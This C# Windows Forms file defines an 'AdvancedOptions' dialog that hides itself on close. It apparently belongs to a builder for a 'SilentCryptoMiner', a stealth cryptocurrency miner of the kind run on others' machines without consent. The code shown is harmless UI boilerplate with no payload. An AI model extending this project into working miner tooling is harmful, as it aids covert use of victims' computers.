using System.Windows.Forms;

namespace SilentCryptoMiner
{
    public partial class AdvancedOptions
    {
        public AdvancedOptions() => InitializeComponent();

        public Builder F;

        private void advancedOptions_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Hide();
        }
    }
}